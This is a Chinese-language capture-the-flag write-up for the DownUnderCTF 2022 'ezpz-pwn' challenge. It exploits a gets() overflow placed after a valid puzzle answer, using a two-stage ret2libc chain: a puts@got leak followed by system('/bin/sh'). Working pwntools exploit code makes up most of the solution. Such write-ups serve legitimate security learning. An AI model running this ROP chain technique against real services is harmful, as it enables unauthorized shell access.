# DownUnderCTF 2022 ezpz-pwn Writeup

## 题目简述

本题与 `ezpz-rev` 使用同一个 64 位 ELF。程序用危险的 `gets(inp)` 读取一个 $14\times14$ 的二进制棋盘答案；前 196 字节必须同时满足每行、每列、每个区域恰有三个 `1`，且任意两个 `1` 不相邻。通过检查后，超出 `inp[196]` 的数据仍会继续覆盖栈帧。

二进制以 `-no-pie -fno-stack-protector` 编译，因此主程序代码和 ROP gadget 地址固定；远端同时提供 glibc 2.35，用于从泄漏计算 libc 基址。

## 解题过程

先使用 `ezpz-rev` 得到合法的 196 字节棋盘：

```python
PUZZLE = (
    b'0101000000001000000101010000101000000001000000000101000110100000'
    b'0001000000101010000001000000001001000010101000000010000000101010'
    b'00101000000000000000101010010101000000000000000001010100010101000000'
)
assert len(PUZZLE) == 196
```

程序的四项检查只读取前 196 字节，所以可在合法解之后附加溢出数据。调试确定从棋盘末尾到保存返回地址还需填充 36 字节。

第一阶段用固定地址的 `pop rdi; ret` 调用 `puts(puts@got)`，再返回 `main`：

```python
payload = flat(
    PUZZLE,
    b'X' * 36,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main'],
)
io.sendline(payload)

puts_addr = u64(io.recvline().strip().ljust(8, b'\0'))
libc.address = puts_addr - libc.sym['puts']
```

第二次进入 `main` 后再次提交合法棋盘与溢出。使用随题提供的 libc 计算 `system` 和 `"/bin/sh"`，并先放一个单独的 `ret` 保持 x86-64 栈的 16 字节对齐：

```python
payload = flat(
    PUZZLE,
    b'X' * 36,
    ret,
    pop_rdi,
    next(libc.search(b'/bin/sh\0')),
    libc.sym['system'],
)
io.sendline(payload)
io.interactive()
```

进入 shell 后读取 flag：

```text
DUCTF{ez_r3t2l1bc_9b8a81cda3}
```

## 方法总结

这是“先满足业务校验，再利用同一输入溢出”的两阶段 ret2libc。前 196 字节必须保持为合法谜题答案，溢出区才能到达返回地址；非 PIE 只固定主程序 gadget，并未固定 ASLR 下的 libc，所以仍需先泄漏 GOT，再用随题 libc 计算第二阶段地址。
